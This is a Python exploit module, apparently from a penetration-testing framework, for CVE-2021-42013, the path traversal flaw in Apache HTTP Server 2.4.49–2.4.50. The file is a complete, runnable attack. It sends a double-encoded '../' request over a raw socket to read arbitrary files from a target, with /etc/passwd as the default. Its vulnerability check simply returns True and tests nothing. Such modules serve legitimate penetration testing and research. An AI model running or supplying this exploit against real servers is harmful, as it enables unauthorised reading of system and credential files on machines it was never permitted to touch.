"""Apache Path Traversal (CVE-2021-42013) exploit module"""

from typing import Dict, Any, Optional
import socket
from rich.console import Console
from rich.panel import Panel
from hatiyar.core.module_base import CVEModule

console = Console()


class Module(CVEModule):
    """Exploit CVE-2021-42013 to read arbitrary files via path traversal"""

    NAME = "Apache HTTP Server Path Traversal"
    DESCRIPTION = "Exploit CVE-2021-42013 to read arbitrary files via path traversal in Apache HTTP Server 2.4.49-2.4.50"
    CATEGORY = "cve"

    CVE = "CVE-2021-42013"

    OPTIONS = {
        "RHOST": "",
        "SCHEME": "http",
        "VERIFY_SSL": False,
        "TIMEOUT": 5,
        "FILE": "/etc/passwd",
        "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
    }

    REQUIRED_OPTIONS = ["RHOST", "FILE"]

    def _try_read_file(self, file_path: str) -> Optional[Dict[str, Any]]:
        """Attempt to read a file using the path traversal exploit via raw HTTP"""
        host = str(self.get_option("RHOST") or "")
        scheme = str(self.get_option("SCHEME") or "http")
        timeout = int(self.get_option("TIMEOUT") or 5)
        user_agent = str(self.get_option("USER_AGENT"))

        # Only HTTP is supported for raw socket approach
        if scheme != "http":
            console.print("[red]Only HTTP is supported for this exploit[/red]")
            return None

        port = 80

        file_path = file_path if file_path.startswith("/") else f"/{file_path}"

        exploit_path = f"/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65{file_path}"

        try:
            request = (
                f"GET {exploit_path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {user_agent}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )

            # Send via raw socket to preserve exact URL encoding
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            sock.sendall(request.encode())

            # Read response
            response = b""
            while True:
                data = sock.recv(4096)
                if not data:
                    break
                response += data

            sock.close()

            # Parse HTTP response
            response_str = response.decode("utf-8", errors="ignore")
            headers_end = response_str.find("\r\n\r\n")
            if headers_end == -1:
                return None

            headers = response_str[:headers_end]
            body = response_str[headers_end + 4 :]

            # Extract status code
            status_line = headers.split("\r\n")[0]
            status_code = int(status_line.split()[1])

            if status_code == 200 and body:
                return {"status_code": status_code, "text": body}

        except (socket.error, socket.timeout) as e:
            console.print(f"[red]Connection failed: {e}[/red]")
            return None
        except Exception as e:
            console.print(f"[red]Request failed: {e}[/red]")
            return None

        return None

    def check(self) -> bool:
        """Check if target is vulnerable - returns True by default for this exploit"""
        return True

    def exploit(self) -> Dict[str, Any]:
        """Attempt to read the requested file using path traversal"""
        target_file = str(self.get_option("FILE") or "/etc/passwd")

        console.print(
            Panel.fit(
                f"Reading [bold]{target_file}[/bold] from {self.get_option('RHOST')}",
                title="CVE-2021-42013",
                border_style="cyan",
            )
        )

        resp = self._try_read_file(target_file)
        if resp is not None:
            console.print("[green]✓ Success! File retrieved[/green]")
            # Display the file content in a panel
            console.print(
                Panel(
                    resp["text"],
                    title=f"Contents of {target_file}",
                    border_style="green",
                    expand=False,
                )
            )
            return {
                "success": True,
                "vulnerable": True,
                "file": target_file,
                "status_code": resp["status_code"],
            }

        return {
            "success": False,
            "error": "Unable to read requested file",
        }
